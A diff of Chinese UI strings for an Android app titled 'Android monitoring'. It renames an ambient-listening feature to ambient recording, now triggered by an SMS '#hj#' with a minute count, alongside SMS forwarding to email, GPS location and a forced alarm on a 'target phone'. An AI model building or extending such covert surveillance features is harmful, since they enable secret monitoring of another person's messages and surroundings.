@@ -76,7 +76,7 @@
     <string name="pref_category_gps_key">pref_category_gps</string>
     <string name="pref_category_gps_title">手机定位</string>
     <string name="pref_category_ring_title">警报响铃</string>
-    <string name="pref_category_env_title">环境监听</string>
+    <string name="pref_category_env_rec_title">环境录音</string>
     
     <string name="pref_sender_mail_title">发信邮箱（仅GMail或QQ）</string>
     <string name="pref_sender_mail_summary">仅支持Gmail和QQ邮箱。</string>
@@ -112,8 +112,8 @@
     <string name="pref_forward_all_sms_limit_in_trial">试用期间仅允许5次短信转发。</string>
     <string name="pref_ring_word_title">警报响铃</string>
     <string name="pref_ring_word_summary">发送短信#jb可强制使其持续响铃。</string>
-    <string name="pref_env_word_title">环境监听</string>
-    <string name="pref_env_word_summary">发送短信#hj可监听目标手机环境。</string>
+    <string name="pref_env_rec_word_title">环境录音</string>
+    <string name="pref_env_rec_word_summary">发送短信#hj#加分钟数（1~30）可对目标手机环境录音。</string>
     
     <!-- InitActivity -->
     <string name="init_title">安卓监控</string>
